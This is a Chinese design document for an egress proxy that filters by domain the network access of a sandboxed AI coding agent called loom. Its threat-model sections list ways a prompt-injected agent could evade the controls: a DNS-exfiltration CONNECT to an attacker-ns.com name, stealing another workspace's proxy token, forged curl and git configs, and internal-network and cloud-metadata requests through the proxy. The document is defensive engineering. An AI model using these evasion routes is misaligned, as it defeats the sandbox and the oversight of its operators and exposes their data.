# Egress Proxy 设计：沙箱内网络的站点级治理

> 状态：草案 v2（经两轮审查修订；M3-a/b/c 实施基线）。平台范围：macOS；Linux 保持 fail-closed（留空）。
> 关联文档：[PERMISSION_DESIGN.md](PERMISSION_DESIGN.md)（能力授予模型、域名规则）、[DESIGN.md](DESIGN.md) §6（沙箱基线）。
> 参考实现：anthropics/sandbox-runtime（srt），本文 §9 给出对照与裁剪清单。
> 修订记录：v1 → v2 修复"IP 字面量绕过 guard"、"SOCKS5 no-auth 跨 workspace 削弱"、"代理内重定向绕过策略"等 8 项审查发现（见 §5.2、§4.1、§4.6 各处标注）。

## 1. 背景与动机

loom 的沙箱网络是 seatbelt 全有/全无开关：默认 deny 外网与 DNS、放行 loopback；`needs_network` 声明 + 审批后整条 profile 追加 `(allow network*)`。这个模型有三个结构性缺口（详见 PERMISSION_QUICKREF 与各 review 记录）：

1. **站点级粒度缺失**：seatbelt 的 `network-outbound` 无法按域名过滤，域名规则（`builtin.json` 的 allow/deny）只在策略层、且只对 argv 里静态可枚举宿主的调用生效。CLI 内部发起的连接（包管理器 postinstall、脚本内联 URL、动态拼接 host）绕过整套域名规则。
2. **运行时不可见**：命令实际连了谁，loom 无从得知——seatbelt 拒绝时不回调，放行后更无记录。审计只能看到"谁获批带网"，看不到"连了哪"。
3. **MCP 网络出口**（REVIEW H12）：第三方 MCP server 经 readOnly 基线自动批准，形成无审批网络出口，现有修复只是补丁。

同时，声明制在 dev（`danger-only`）模式下的体验成本是真实的：模型未预判网络需求 → DNS 挂到超时 → 浪费一轮重试。用户诉求是"dev 模式默认放网，规则拦危险站点"——但 seatbelt 给不了站点级拦截，这条路只有在沙箱外引入**出口代理（egress proxy）**才能闭环：

- 沙箱内直连外网继续被 seatbelt 拒绝（边界不动）；
- 代理监听 loopback，按域名策略**在真实连接建立前**放行/拒绝（CLI 内部行为同样经过）；
- 每条连接（host、port、决策、命中规则）落日志——可见性从声明级升级到连接级。

## 2. 目标与非目标

### 2.1 目标（本次实施范围，M3-a/b/c）

- **M3-a**：Go 原生 egress proxy 内核：单端口协议复用（HTTP CONNECT + 明文 HTTP 转发 + SOCKS5）、token 鉴权、域名策略回调、resolved-address 防护、连接日志、资源限额。
- **M3-b**：执行层集成：seatbelt profile 新增 proxy 形态（trustd mach-lookup）、runner env 注入、`seatbelt+proxy` 隔离标注；`NetworkFull` grant 在 proxy 模式下退化为 no-op。
- **M3-c**：配置与策略接线：`sandbox.network: off|proxy|full` + `sandbox.proxy.unmatched: allow|deny`；策略回调复用 `PackageSet` 的 host 规则（builtin/user/project/session 四层，deny 优先）；bootstrap 生命周期管理。

### 2.2 非目标（明确不做，及理由）

- **TLS MITM**：域名级过滤够用，避开 CA 生成/分发/信任注入（`SSL_CERT_FILE`/`GIT_SSL_CAINFO`/`NODE_EXTRA_CA_CERTS`…）的全部复杂度与 mTLS/证书钉扎的破坏面。代价是看不到 URL 路径与请求体——接受。
- **连接级交互审批**（srt 的 SandboxAskCallback）：v1 只做静态规则过滤 + unmatched 默认姿态；交互审批等静态规则跑顺后再议。
- **Linux**：`NewPlatformSandbox` 保持 `UnsupportedSandbox`，run_cmd 继续 fail-closed。配置在 Linux 上不生效（不报错、不放行）。
- **MCP server 沙箱化**（M3-d）：设计预留（proxy 策略与生命周期与 workspace 绑定，MCP 进程可复用同一 wrapper），本次不实施。
- **SSH/git-over-ssh 特化处理**：srt 经 SOCKS + `GIT_SSH_COMMAND` 支持，但 loom 沙箱内 `~/.ssh` 凭证不可读（`sensitiveReadDenies`），ssh 客户端拿不到私钥，支持无意义。git ssh remote 在沙箱内失败是预期行为，用 https remote。
- **Java agent 注入**（`JAVA_TOOL_OPTIONS`）：JVM 无视 proxy env。srt 用 javaagent 解决；loom 遇到真实 Bazel/Gradle 远端缓存场景再做。
- **seatbelt 违规日志监控**（srt 的 `log stream` 方案）：proxy 连接日志已覆盖网络维度；文件维度违规监控暂不需要。

## 3. 总体架构

```
┌─ sandboxed command (seatbelt) ─────────────────────────┐
│  直连外网/DNS：deny（不变）                              │
│  loopback：allow（不变，dev server 场景）                 │
│  env: HTTP(S)_PROXY/ALL_PROXY/GRPC_PROXY ─────┐         │
└───────────────────────────────────────────────┼─────────┘
                                                 ▼ CONNECT / absolute-URI / SOCKS5
┌─ egress.Server（host 进程内，loom 主进程） ──────────────┐
│  1. 鉴权（HTTP 腿 token / SOCKS5 腿保守策略，§4.1.3）     │
│  2. Policy.Decide(host, port) ──► PackageSet host 规则   │
│     （builtin/user/project/session，deny 优先）           │
│     未命中 ──► config: unmatched = allow|deny             │
│  3. ResolvedAddrGuard：解析 → 剔除禁类地址 → 拨号          │
│  4. Logger.LogConn(record)（每次连接一条）                 │
└──────────────────────────────────────────────────────────┘
```

关键架构性质：

- **seatbelt 仍是边界**：proxy env 只是指引，无视 env 的客户端直连失败（fail-closed），不是绕过。loom 现有 profile 已放行 loopback 出向（`(allow network-outbound (remote ip "localhost:*"))`），连接代理端口无需新增网络规则。
- **依赖方向**：`egress` 包不 import `permission`（`permission` 已 import `process`）；策略以回调接口注入，app 层（bootstrap）实现回调并桥接 `PackageSet`。
- **生命周期**：proxy 挂在 workspace `Bootstrap` 上（每个 workspace 一个实例、独立端口与 token），随 `Bootstrap.Close` 释放。多 workspace 共存的交叉风险见 §5.2-6/§5.2-8。

## 4. 详细设计

### 4.1 egress 包（`internal/process/egress/`）

#### 4.1.1 API

```go
package egress

// Decision 是一次连接的策略判定，含 guard 豁免所需的全部信息——
// 决策与豁免字面量在同一次规则集快照内产出（同一把锁），
// 规则热更/遗忘不影响在途连接的判定一致性（审查 A-4）。
type Decision struct {
    Allow   bool
    Matched bool   // 命中显式规则（非 unmatched 默认姿态）
    Reason  string // 人类可读理由（命中规则的 justification 或默认姿态说明）
    Rule    string // 来源："builtin" | "user" | "project" | "session" | "unmatched-allow" | "unmatched-deny"
    // ExemptLiterals 是快照中显式 allow 规则点名的 IP 字面量
    // （BindHost 可解析为 IP 的条目；无端口维度——host 规则语法
    // 本身不含 :port，审查 A-3）。仅供 resolved-address guard 豁免。
    ExemptLiterals []netip.Addr
}

// Policy 判定 host:port 是否允许连接。host 是客户端请求的原始拼写
// （规范化在包内完成，§4.1.4）。实现必须并发安全。
type Policy interface {
    Decide(host string, port int) Decision
}

// ConnRecord 是每次连接尝试（无论成败）的一条记录。
type ConnRecord struct {
    Time     time.Time
    Proto    string // "connect" | "http" | "socks5"
    Host     string
    Port     int
    Decision Decision
    Dialed   string // 实际拨号的 IP（拒绝或失败时为空）
    Err      string // 拨号/转发错误（成功时为空）；策略拒绝与解析失败分记
}

// Logger 接收连接记录；nil 表示只过策略不留痕（不推荐）。
type Logger interface {
    LogConn(ConnRecord)
}

type Config struct {
    Policy Policy
    Logger Logger
    // Token 为空时由 NewServer 生成（crypto/rand，32 字节 hex）。
    Token string
    // MaxConns 限制并发连接（含隧道）总数，超出拒绝新连接。
    // 0 取默认 512——代理挂在 loom 主进程内，fd/goroutine 爆炸半径
    // 是整个 loom，限额是主进程自保（审查 D-3）。
    MaxConns int
    // Guard 的测试接缝：自定义解析器与拨号器。生产为 nil（net 默认）。
    LookupIP func(ctx context.Context, host string) ([]netip.Addr, error)
    Dial     func(ctx context.Context, addr netip.AddrPort) (net.Conn, error)
    // LocalAddrs 返回本机网卡地址（resolved-address guard 用），
    // 每次解析时现取；生产为 nil（net.InterfaceAddrs）。
    LocalAddrs func() ([]netip.Addr, error)
}

type Server struct{ /* unexported */ }

func NewServer(cfg Config) (*Server, error) // 监听 127.0.0.1:0
func (s *Server) Addr() string              // "127.0.0.1:<port>"
func (s *Server) Port() int
func (s *Server) Token() string
func (s *Server) ProxyURL() string          // http://loom:<token>@127.0.0.1:<port>
func (s *Server) Close() error              // 停 listener；活跃隧道排空上限 5s 后强断
```

#### 4.1.2 协议复用（mux）

单端口按首字节嗅探（与 srt mux-proxy 对齐）：

- 首字节 `0x05` → SOCKS5；**不支持 SOCKS4**（`0x04` 落入 HTTP 路径吃 400，§6 声明）；
- 大写字母开头（HTTP 方法，含 `CONNECT`）→ HTTP 处理；
- 其他 → 400 关闭。

**超时从 accept 起算**：首字节/请求头读取 10s 上限（慢速或静默连接不得占住 fd，审查 B-3/D-2）。**单 bufio.Reader 原则**（审查 D-1）：连接生命周期内只用一个 `bufio.Reader`——嗅探用 `Peek` 不消费；CONNECT 头解析后客户端可能已同包送达 TLS ClientHello（pipelined first flight），隧道移交后 client→upstream 的 `io.Copy` 必须以该 Reader 为源（先吐缓冲再读底层 conn），直接对 raw conn 拷贝会静默丢首包、TLS 握手 hang。绝不 drain/close server 侧 `req.Body`。

#### 4.1.3 鉴权与跨 workspace 威胁模型（审查 A-1 修订）

- **HTTP CONNECT / 明文转发**：必须携带 `Proxy-Authorization: Basic base64("loom:<token>")`；缺失或错误回 `407` 且带 `Proxy-Authenticate: Basic realm="loom-egress"`（部分客户端没有它不重试带凭据请求）。token 内嵌在注入子进程的 proxy URL userinfo 里。
- **SOCKS5**：接受 no-auth（`nc -X 5` 等 ProxyCommand 客户端不支持认证），但 **no-auth 连接固定按保守策略评估**：只放行全局层（builtin/user，非 workspace 限定、非 session）显式 allow 规则，unmatched 姿态（无论 allow/deny）一律不适用、deny 规则仍然生效。共享机器上非 loom 进程、以及其他 workspace 的沙箱进程经 SOCKS 跳跃的收益被限制在 builtin allow 集合内。
- **威胁模型措辞（如实）**：token 防本机进程**误用**（confused deputy），**不防沙箱内攻击者跨 workspace 冒用**——沙箱内进程与 loom 同 UID，可 `ps eww`/`lsof` 发现其他 workspace 的代理端口、甚至读出其子进程 env 里的 token。因此：**多 workspace 混用时，某 workspace 的 `unmatched=deny` 不构成对其他 workspace 代理的硬边界**（HTTP 腿用窃取 token、SOCKS5 腿只剩保守策略兜底）。该残留记入 §5.2-8；彻底解法（单例 + per-workspace token + 调用归因）留给连接级审批一并设计。

#### 4.1.4 CONNECT 处理流程

1. **输入合法性**：解析 authority（`host:port`，缺省 port=443）。拒绝：端口不在 1-65535、userinfo（`user@host`）、路径（`/`）、IPv6 zone（`[fe80::1%en0]`）、空 host。host 规范化（小写、去 IPv6 括号、去尾部点）——后续策略判定、guard、拨号、ConnRecord 全部使用**规范化后的同一拼写**，不回放客户端原始拼写（堵 URL 解析器差异绕过）。
2. 鉴权（§4.1.3）。
3. `Policy.Decide(host, port)`：拒绝 → `403`，body 携带 `blocked by loom egress policy: <Reason>`，记 ConnRecord。
4. **ResolvedAddrGuard**（§4.1.6）：域名解析一次，剔除禁类地址，无存活地址 → `403`（reason 只报地址类别，不泄露具体 IP——客户端在沙箱内，不该从拒绝信息里学到内网拓扑）。**IP 字面量目标同样过 guard**：仅当字面量命中显式 allow 规则（`Decision.Matched && Allow`，或包含在 `ExemptLiterals` 中）才豁免；否则按禁类集合判定——`unmatched=allow` 姿态下 `curl http://169.254.169.254/` 必须被 guard 拦下（srt 可以"字面量直接通过"是因为其未命中默认 deny，loom 默认 allow 未命中项，必须补这一判定）。
5. 拨号存活地址（**解析与拨号之间不做第二次解析**，防 DNS rebinding TOCTOU；拨号 10s 上限）。**自连环拒绝**：目标等于代理自身监听地址（`127.0.0.1:<port>` 或 `::1:<port>`）一律拒绝——字面量 allow 了 loopback 也不能让代理连接自己形成递归隧道。
6. `200 Connection Established` 后：**清除连接上的 read deadline**（否则长连接被自己的头读超时杀掉——Go `SetReadDeadline` 模式最经典的 bug，审查 B-4），双向转发 `io.Copy` + 半关闭传播（一端 EOF → 关闭对端写，等另一端排空）。已建立隧道**不设空闲超时**（SSE/websocket 等长连接是合法负载）。

#### 4.1.5 明文 HTTP 转发

absolute-URI 请求（`GET http://host/path HTTP/1.1`）：

1. host:port 规范化（缺省 port=80）、输入合法性、鉴权、策略、guard 同上（拒绝回 403）。absolute-form 但 scheme=https → 400（避免降级歧义）；origin-form（相对 URI）→ 400。
2. 剥离请求侧 hop-by-hop 头（`Connection`、`Proxy-Connection`、`Proxy-Authorization`、`Keep-Alive`、`TE`、`Trailer`、`Transfer-Encoding`、`Upgrade`）；**转发的 absolute-URI 与 Host 头由规范化 host 重建**。
3. **硬约束（审查 B-1）：上游请求必须经 `http.Transport.RoundTrip` 发出，禁止代理内自动跟随重定向**（若用 `http.Client.Do`，302 后续跳只过地址类别检查、不再过域名规则——任何 allow 域名的 302 都能重新打开 builtin deny 的 exfil 通道）。`req.RequestURI` 必须清空（`http.ReadRequest` 会设置它，`RoundTrip` 见到非空直接报错——Go forward proxy 第一经典坑）。响应侧同样剥 hop-by-hop 头。
4. **header 上限**：`http.ReadRequest` 底层无头部总量限制，必须包 `io.LimitReader`（256KB，超限回 431）防沙箱进程对主进程内存 DoS。

#### 4.1.6 SOCKS5 处理

- greeting：支持任意碎片到达的累积缓冲解析；`NMETHODS=0` 或无共同方法 → 回 `0xFF` 关闭；接受 no-auth（§4.1.3 的保守策略适用）。
- 仅 CONNECT 命令（无 BIND/UDP ASSOCIATE）；目标三类地址（IPv4/IPv6/DOMAINNAME）均规范化后过同一 Decide+guard+自连环拒绝流程。**DOMAINNAME 是长度前缀原始字节串，协议零校验**：拒绝含控制字符（`\r\n`、NUL 等）的名称——否则脏数据进 ConnRecord 造成日志伪造（审查 B-2）。
- 握手各阶段 read deadline 10s；隧道建立后清除（同 §4.1.4-6）。

#### 4.1.7 ResolvedAddressGuard

对齐 srt `resolved-address-guard.ts`，Go `netip` 实现。禁类集合（域名解析结果的每个地址逐项判定）：

| 类别 | 范围 |
|---|---|
| loopback | `127.0.0.0/8`、`::1` |
| unspecified | `0.0.0.0/8`、`::` |
| link-local | `169.254.0.0/16`、`fe80::/10` |
| multicast | `224.0.0.0/4`、`ff00::/8` |
| broadcast | `255.255.255.255` |
| 云 metadata | `100.100.100.200`（阿里）、`168.63.129.16`（Azure）、`192.0.0.192`（OCI）、`fd00:ec2::/32`、`fd20:ce::254`、`fd00:c1::a9fe:a9fe`、`fd00:42::42`、`fd00:a9fe:a9fe::1`、`fd00:100::100:200`（`169.254.169.254` 已被 link-local 覆盖） |
| 本机网卡地址 | `net.InterfaceAddrs()` 全部单播地址（绑 0.0.0.0 的服务在网卡地址上等同 loopback 应答），每次解析现取 |

规则与豁免：

- IPv4 内嵌形式解码后同样受禁：`::ffff:x`（`netip.Addr.Unmap`）、NAT64 well-known `64:ff9b::/96`、6to4 `2002::/16`（后两者 `netip` 无内建，手工 `AddrFrom16` 拆字节）。带 zone 的地址先 `WithZone("")` 再分类。**解码只追加拒绝，永不产生豁免**（防 `::1` 的 IPv4-compatible 形式搭豁免便车）。
- 豁免只认 `Decision.ExemptLiterals`（同快照，§4.1.1），且收集是 **host 作用域**的：只有匹配本连接 host 的 allow 规则贡献字面量，因此豁免实际只对"目标即字面量本身"的连接存在——域名解析到禁类地址**永不豁免**（`myapp.test` → `127.0.0.1` 这类自定义名称不可经代理访问；开发场景的 loopback 由 NO_PROXY 引导直连 + seatbelt 放行 loopback 出向来承载）。豁免无端口维度（host 规则无 `:port` 语法，§4.2）。
- IP 字面量目标：`Matched && Allow` 豁免，否则过禁类集合（§4.1.4-4）。
- `localhost` 及 `*.localhost`（RFC 6761）：只允许解析到 loopback 或豁免字面量，其余一律拒绝。
- RFC1918/ULA/CGNAT 私网**默认不拒**（allowlist 内网域名是合法场景）——默认姿态下的内网可达性是已声明的接受风险（§5.2-7）。

#### 4.1.8 连接日志

每次连接尝试（含拒绝与解析失败，分记 `Err`）产一条 `ConnRecord`。v1 由 app 层接到 `slog`（`logger.With("component", "egress")`），并预留接口供后续接 trace/audit。允许与拒绝都记——可见性是本特性的核心收益。

### 4.2 域名策略：复用 PackageSet

`PackageSet` 已持有四层（builtin/user/project/session）host 绑定规则（`Bind.Kind == BindHost`，`hostMatchesPattern`：精确或 `*.` 后缀通配、不含 apex）。新增方法：

```go
// DecideEgress 判定到 host 的出向连接（单把 RLock 内完成，审查 A-4）：
// deny 规则优先于 allow（strictest-wins）；同时返回快照中显式 allow
// 规则点名的 IP 字面量（guard 豁免用）。workspace 过滤工作区级规则
// 的可见性。matched=false 表示无任何 host 规则命中。
func (s *PackageSet) DecideEgress(host, workspace string) (allow bool, pkg Package, literals []netip.Addr, matched bool)
```

app 层把 `DecideEgress` 适配为 `egress.Policy`：

- 命中 → 按规则决策，`Matched=true`，`Reason` 取 `pkg.Justification`，`Rule` 取 scope；
- 未命中 → 配置姿态 `sandbox.proxy.unmatched`（`Matched=false`）：
  - `allow`（**默认**）：放行，Rule="unmatched-allow"。这是"dev 模式默认放网、规则拦危险站点"的落地形态——黑名单（builtin 的 exfil 通道 + 用户规则）在真实连接上强制执行，其余放行且留痕。
  - `deny`：拒绝，Rule="unmatched-deny"。allowlist 姿态（srt 默认），适合敏感工作区。
- SOCKS5 no-auth 连接走保守适配（§4.1.3）：只有 scope 为 builtin/user 的规则参与，session/project 规则与 unmatched 姿态不适用。

端口维度：loom 的 host 规则无 `:port` 后缀语义，v1 忽略 port（记录但不参与匹配）；后续可为 BindHost 扩展 `:port` 后缀并收紧豁免到精确端口。

### 4.3 执行层：seatbelt profile 与 env 注入

#### 4.3.1 profile 变化（`sandbox_darwin.go`）

`SeatbeltSandbox` 新增可选字段 `proxy *ProxyEnv`。proxy 模式下：

1. **网络规则不变**：现有 loopback 三规则（bind/inbound/outbound）已覆盖"连接代理端口"；外网直连继续被 default-deny 拒绝。这正是该方案侵入面小的原因。
2. **新增 trustd 规则**（proxy 模式才追加）：

   ```
   (allow mach-lookup (global-name "com.apple.trustd.agent"))
   ```

   Go 程序在 macOS 上验证 TLS 证书走 Security framework（trustd）；CONNECT 隧道模式下 TLS 握手由沙箱内客户端自己完成，不放行 trustd 则所有 Go 程序的 HTTPS 验证失败。srt 同样标注：trustd 是弱化的隔离（理论上可借 trustd 外泄），proxy 模式接受此交换并在本文存档（§5.2-1）。

3. **`widenSandbox` 的两条硬约束**（审查 C-2）：(a) 逐字段克隆时**必须原样拷贝 `proxy` 字段**（现有实现是逐字段重构 `SeatbeltSandbox`，漏拷则带 grant 的执行得到一个既无 proxy env 又无网络的沙箱——莫名失败且无报错指向）；(b) `proxy != nil` 时忽略 `NetworkFull` grant（代理就是网络答案，全量放网会绕过策略）。其余 grant（WritablePaths/GUIOpen/Unsandboxed）语义不变。
4. `Isolation()` 返回新增的 `SeatbeltProxyIsolation`（`"seatbelt+proxy"`），widened 副本同样保持（审计/UI 如实标注，PERMISSION_DESIGN §235 的要求）。

#### 4.3.2 env 注入

注入点在 `SeatbeltSandbox.Prepare`：`SandboxLaunch.Env` 尾部追加（Go exec 重复键 last-wins，尾部追加兜底；且模型的 env 先经 allowlist 过滤——`HTTP_PROXY` 等键不在 allowlist 也无 `SKILL_` 前缀，一律丢弃并记入 `DroppedEnvKeys`——本就无法经 env 参数注入这些键）：

```
HTTP_PROXY=http://loom:<token>@127.0.0.1:<port>
HTTPS_PROXY=同上；http_proxy/https_proxy 小写副本
ALL_PROXY/all_proxy=同上（http URL，避免 socks5h 触发 httpx 的 socksio 导入问题）
GRPC_PROXY/grpc_proxy=同上（gRPC 只认 CONNECT）
NO_PROXY/no_proxy=localhost,127.0.0.1,::1,169.254.0.0/16,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16
```

NO_PROXY 含私网与 link-local：这些目标在客户端侧直连（seatbelt 拒绝、fail-closed），不经过代理。刻意不含 `*.local`：沙箱内无可用解析器，`.local` 走代理由宿主机解析（对齐 srt）。内网经代理可达的残留见 §5.2-7。

**env 注入不是边界**（审查 C-1 推论）：模型仍可经 `HOME`/`GIT_CONFIG_GLOBAL`（在 allowlist）指向伪造的 `.curlrc`/gitconfig、或命令行内联 `HTTPS_PROXY=...` 改变工具的代理指向——唯一直接后果是跳到**另一个可达代理**（跨 workspace 场景，§4.1.3/§5.2-8），直连依然 fail-closed。

#### 4.3.3 失败语义与 run_cmd 提示

proxy 模式下 `classifyRunError` 的网络类建议改述为："网络经 egress 代理按域名策略过滤；`curl <host>` 被 403 = 命中 deny 规则或地址类别拦截；无视 proxy env 的工具直连失败 = fail-closed，可用 `sandbox_permissions='require_escalated'` 兜底（将绕过 egress 过滤与日志）"。系统 prompt 的适配（proxy 模式下弱化 `needs_network` 引导）列为后续项，本期不动 prompt。

### 4.4 配置（`~/.loom/config.yaml`）

```yaml
sandbox:
  network: off        # off（默认，现状）| proxy | full
  proxy:
    unmatched: allow  # allow（默认）| deny
```

- `off`：现状（default-deny + needs_network 声明制）。
- `proxy`：本文方案。`NewPlatformSandbox` 收到 `ProxyEnv`。
- `full`：ambient 全量放网（`PlatformSandboxOptions.AllowNetwork=true`），无代理、无过滤、无日志——前期讨论的 opt-in，顺手提供，文档标注其可见性弱于 proxy。
- `Resolve` 校验：非法取值报错（与 `approval.mode` 同构）；Linux 上 `proxy`/`full` 不改变 fail-closed 行为（`sandbox_linux.go` 无需改动）。

### 4.5 生命周期与集成（`internal/app/bootstrap.go`）

`NewWorkspaceBootstrap` 中、`NewRunner` 之前：

1. `resolved.Sandbox.Network == "proxy"` → 构造 `egress.Server`：
   - Policy：桥接 `proc.Packages.DecideEgress(host, workspaceRoot)` + unmatched 默认 + SOCKS5 保守适配；
   - Logger：桥接 `proc.Logger`；
2. `NewPlatformSandbox(PlatformSandboxOptions{Proxy: &egress.ProxyEnv{URL: server.ProxyURL()}})` 注入 Runner——`run_cmd`、`exec_session`、git 工具、子代理全部经同一 Runner 路径，自动获得 proxy 环境。
3. `Bootstrap` 新增 `Egress *egress.Server` 字段，`Close` 时释放（在 session manager 关闭之后）。

失败处理：proxy 监听失败（端口冲突等）在 proxy 模式下是 bootstrap 硬错误——配置了代理却静默退化回无网沙箱会让所有网络命令莫名失败，启动即报错更易诊断。

### 4.6 与既有体系的交互矩阵

| 既有机制 | proxy 模式下的行为 |
|---|---|
| `needs_network` 声明 / `NetworkFull` grant | no-op（§4.3.1-3）。审批链照常记录，执行不再摘代理 |
| `require_escalated`（Unsandboxed） | 不变：DirectSandbox 完全出沙箱，代理管不着（这是设计好的逃生门；审批文案提示"绕过 egress 过滤与日志"列为后续项） |
| `writable_paths` / `gui_open` grant | 不变 |
| web_fetch | 不变（进程内直连）。**规则集同源**（同一 `PackageSet` BindHost 规则，deny 优先语义一致），但**决策维度不同**：web_fetch 自带地址类别 guard（默认拒 RFC1918/CGNAT/loopback，`allow_private` 才放行）与审批姿态（on-request 下未命中 Ask）均独立于 egress——同一内网 host 可能出现"run_cmd+proxy 通、web_fetch 拒"，属预期差异。`network_hosts` 授权（argv 绑定包的 host 粒度能力）**不参与** proxy 决策：`unmatched=deny` 下，已批准 argv 命令的真实连接仍需 BindHost 规则覆盖 |
| browser 工具 | 不变（headless Chrome 进程外，不经沙箱） |
| exec_session / 子代理 / git 工具 | 自动继承（同一 Runner） |
| MCP 工具 | 不变（M3-d 才纳入） |
| `never` 模式的网络自动授予 | grant 变 no-op，命令经代理执行，语义保持"沙箱内解决网络"；`unmatched=deny` 下网络命令收到 403（fail-closed，无提示循环风险） |

## 5. 威胁模型与安全分析

### 5.1 边界声明

proxy 模式的边界 = seatbelt（直连拒绝）+ 代理策略（域名过滤）+ resolved-address guard（重绑定/SSRF 防护）。攻击者模型不变：模型被注入（恶意网页/issue/依赖）后驱动的沙箱内命令。

### 5.2 明确接受的弱化与残留风险

1. **trustd 通道**：Go 程序 TLS 验证需要 `com.apple.trustd.agent`（§4.3.1-2）。理论上可构造与 trustd 的交互外泄数据（srt 同样标注）。接受理由：无它则 Go 生态在 proxy 模式整体不可用。
2. **域名级过滤天花板**：防不了 domain fronting（借 CDN 域名的 SNI/Host 分离）；宽域名（`github.com`）本身可作 exfil 通道（gist 上传）。这是域名级过滤的架构上限，MITM 也只能部分缓解——文档声明，不解决。
3. **unmatched=allow 姿态**：默认配置下未列入 deny 的任意域名可连。危险站点清单永远不完整——本姿态的定位是"可见性 + 已知危险拦截"，不是边界。需要硬边界的工作区应配 `unmatched: deny`。
4. **凭证可读面不变**：`sensitiveReadDenies` 在 proxy 模式原样生效——即使命令拿到网络，经典 secrets 外泄面（`~/.ssh` 等）仍被读拒绝覆盖。proxy 主要新增保护的是**非凭证可读数据**（源码、文档）的外泄可见性，以及内网/metadata 的 SSRF 面。
5. **loopback 可达面不变**：沙箱内本就能连本机所有 loopback 服务（dev server 场景的既有取舍），proxy 不改变这一点；guard 反而阻止了"经代理回连 loopback"的新通道（字面量未显式 allow 时）。
6. **token 非强边界**（§4.1.3）：防本机误用，不防同 UID 沙箱内攻击者跨 workspace 冒用。
7. **内网可达性（默认姿态下真实存在，明示）**：guard 对齐 srt 不默认拒绝 RFC1918/ULA/CGNAT——`unmatched=allow` 下，无视 NO_PROXY 的客户端可经代理直达内网任意 host/IP（`curl -x $HTTP_PROXY http://10.x.x.x/`）。合规客户端被 NO_PROXY 引导直连而 fail-closed，但 NO_PROXY 只是约定不是边界。**公司内网隐式信任的服务（无鉴权 admin 端点）在默认配置下经代理可达**——这和"ambient 网络"的用户诉求是同一枚硬币的两面，选择接受并明示；敏感工作区的缓释是 `unmatched: deny` + 显式 allow 规则。云 metadata 等最危险目标不受此影响（§4.1.4-4 的字面量判定在 allow 姿态下依然拦截）。
8. **多 workspace 混用削弱 `unmatched=deny`**（审查 A-1）：workspace A（deny 姿态）的沙箱进程可发现并使用 workspace B 的代理（HTTP 腿窃取 token、SOCKS5 腿受保守策略限制，§4.1.3）。A 的硬边界在多 workspace 共存时退化为"B 的姿态 ∪ builtin allow 集合"。缓释：敏感工作区与宽松工作区不要同时挂在同一 loom 进程；根治留给连接级审批的单例化设计。
9. **DNS 解析本身是 exfil 通道**（审查 A-2）：CONNECT 的 host 由代理侧解析，`CONNECT <base64负载>.attacker-ns.com:443` 在 `unmatched=allow` 下过策略后，guard 的解析请求即完成外泄（NXDOMAIN 亦然），无需建立 TCP。连接日志仅事后可见。缓释：`unmatched: deny`；日志中"解析失败"与"策略拒绝"分记以便事后发现异常域名模式。

### 5.3 相对现状的安全增量

- deny 域名规则从"argv 静态匹配"升级为"真实连接拦截"（不透明子进程同样受约束）；
- 连接级全量日志（此前网络目标对 loom 是纯黑盒）；
- 云 metadata/本机地址/回环重绑定防护（此前 `NetworkFull` 一放即全网直达，含 `169.254.169.254`）；
- H12 类 MCP 出口的根治路径（M3-d 的地基）。

## 6. 已知限制（用户可见）

- 无视 proxy env 的客户端（部分数据库驱动、raw socket 工具）在 proxy 模式下网络失败——fail-closed 是预期行为，兜底是 `require_escalated`。
- 沙箱内 DNS 解析（mDNSResponder）仍拒绝：遵守 proxy env 的客户端把域名交给代理解析，不受影响；自行解析的客户端失败。
- git ssh remote 不可用（凭证不可读，§2.2）；JVM 工具不经代理（§2.2）。
- 明文 HTTP 转发只覆盖 absolute-URI 标准用法；`Upgrade`（websocket over http）与 absolute-form https URI 不支持（400）。
- SOCKS5 仅 CONNECT 命令（无 BIND/UDP ASSOCIATE），no-auth + 保守策略；不支持 SOCKS4。

## 7. 测试计划

遵循 loom 既有惯例：表驱动单测 + macOS live probe（对标 `runner_seatbelt_test.go`，真实 `sandbox-exec` 验证）。

- **egress 单测**（注入 seam：fake Policy/LookupIP/Dial/LocalAddrs）：
  - CONNECT：allow → 200 + 端到端字节透传（**含"CONNECT 与 TLS 首包同包到达"用例**，审查 D-1）；deny → 403 带 reason；缺/错 token → 407 且带 `Proxy-Authenticate`；畸形 authority（端口越界、userinfo、路径、IPv6 zone）→ 400；目标==代理自身地址 → 拒绝。
  - 明文转发：absolute-URI 转发且剥离 hop-by-hop 头；origin-form / https absolute-form → 400；`Proxy-Authorization` 不外泄到 upstream；**allow 域名 302 → deny 域名，第二跳被 403**（审查 B-1）；头部超限 → 431。
  - SOCKS5：握手 + CONNECT allow/deny（含保守策略：session 规则与 unmatched-allow 不适用）；DOMAINNAME 控制字符 → 拒绝；分包到达 → 正确解析；`NMETHODS=0` → `0xFF`。
  - Guard：loopback/link-local/metadata/NAT64/6to4/4-in-6/带 zone/本机地址各类拒绝；ExemptLiterals 豁免；IP 字面量在 unmatched-allow 下过禁类集合（`169.254.169.254` 被拒）；豁免只减不增（IPv4-compatible 不搭便车）；localhost 名称规则。
  - mux：单端口三种协议分流；静默连接 10s 超时关闭。
  - 资源限额：超过 MaxConns 的新连接被拒；SSE 式长连接存活 >10s 不被误杀（deadline 已清除）。
- **seatbelt profile 测试**：proxy 模式含 trustd 规则与 `seatbelt+proxy` 标注；`widenSandbox` 拷贝 proxy 字段且忽略 `NetworkFull`（**带 NetworkFull grant 的执行仍注入 proxy env 且标注 seatbelt+proxy**，审查 C-2）；env 追加在尾部且不被模型 env 覆盖。
- **live probe（macOS）**：沙箱内 `curl -x $HTTP_PROXY` 经真实 `egress.Server` 访问 allow 域名成功、deny 域名 403；`curl --noproxy '' https://...` 直连失败；macOS git 对 407+URL userinfo 的处理实测。
- **config**：`sandbox.network`/`proxy.unmatched` 解析与非法值报错。
- **PackageSet.DecideEgress**：deny 优先、workspace 可见性、四层来源标注、豁免字面量快照一致性。

## 8. 里程碑

| 里程碑 | 内容 | 验证 |
|---|---|---|
| M3-a | `internal/process/egress/` 全部内核 + 单测 | 单测全绿 |
| M3-b | seatbelt proxy 形态 + env 注入 + trustd + isolation 标注 | profile 断言 + live probe |
| M3-c | config + `DecideEgress` + bootstrap 接线 + run_cmd 提示改述 | config/策略单测 + 端到端 |
| M3-d（后续） | MCP server 经同一 wrapper 启动（根治 H12） | 另行设计 |
| 后续候选 | 连接级交互审批（含单例化+per-workspace token 根治 §5.2-8）、prompt 适配、内网代理旋钮、Java agent、BindHost `:port` 后缀、Linux bubblewrap | — |

## 9. 与 srt 的对照与裁剪

| srt 能力 | loom 取舍 | 理由 |
|---|---|---|
